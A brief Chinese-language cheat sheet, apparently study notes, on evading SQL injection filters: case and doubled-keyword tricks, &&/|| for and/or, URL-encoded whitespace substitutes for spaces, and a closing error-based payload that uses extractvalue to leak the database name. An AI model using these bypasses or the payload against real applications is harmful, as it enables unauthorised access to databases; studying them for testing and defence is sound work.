# SQLi过滤绕过

## `and`, `or` 过滤绕过

### 1. 大小写绕过

### 2. 复写绕过

### 3. `&&`, `||` 绕过

用 `&&` 和 `||` 代替 `and` 和 `or`

提交的时候要使用URL编码

## 空格过滤绕过

### 1. `+` 代替空格

### 2. URL编码代替空格

| 符号 | URL编码 |
| ---- | ------- |
|`spaces`|`%20`|
|`tab`|`%09`|
|`LF OA new line`|`%0a`|
|`FF 0C new page`|`%0c`|
|`CR 0D carriage return`|`%0d`|
|`VT 0B vertical tab`|`%0b`|
|`-OA-` (MySQL Only)|`%a0`|

## 使用报错注入

`?id=1'||extractvalue(1,concat(0x7e,(database()),0x7e))#`
